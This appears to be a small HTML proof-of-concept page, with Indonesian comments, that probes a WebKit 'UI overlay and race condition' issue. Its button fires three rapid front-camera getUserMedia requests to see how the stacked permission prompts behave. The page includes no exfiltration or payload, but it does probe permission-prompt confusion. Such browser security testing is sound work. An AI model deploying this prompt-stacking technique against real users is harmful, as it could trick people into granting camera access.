<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC 2: UI Overlay & Race Condition</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; text-align: center; margin: 0; padding: 20px; }
        .trigger-zone { height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .heavy-btn { background: #ff9500; color: #000; border: none; padding: 25px; font-size: 18px; font-weight: bold; border-radius: 50%; width: 200px; height: 200px; cursor: pointer; box-shadow: 0 0 20px rgba(255,149,0,0.5); }
        .status-box { margin-top: 20px; font-family: monospace; color: #aeaeaebd; }
    </style>
</head>
<body>

<div class="trigger-zone">
    <button id="loopTrigger" class="heavy-btn">UJI RESPONS UI</button>
    <div class="status-box">Ketuk untuk memicu runtunan permintaan objek WebKit</div>
</div>

<script>
    const btn = document.getElementById('loopTrigger');
    
    async function triggerMediaObject() {
        try {
            // Memaksa penargetan modul kamera depan eksternal secara berulang
            await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
        } catch (err) {
            console.log("Sistem memblokir / menolak otomatis:", err.name);
        }
    }

    btn.addEventListener('click', () => {
        btn.textContent = "PENGUJIAN BERJALAN...";
        btn.style.background = "#555";
        
        // Memicu permintaan berturut-turut untuk melihat perilaku tumpukan pop-up di bilah alamat
        for(let i = 0; i < 3; i++) {
            setTimeout(triggerMediaObject, i * 300);
        }
    });
</script>
</body>
</html>
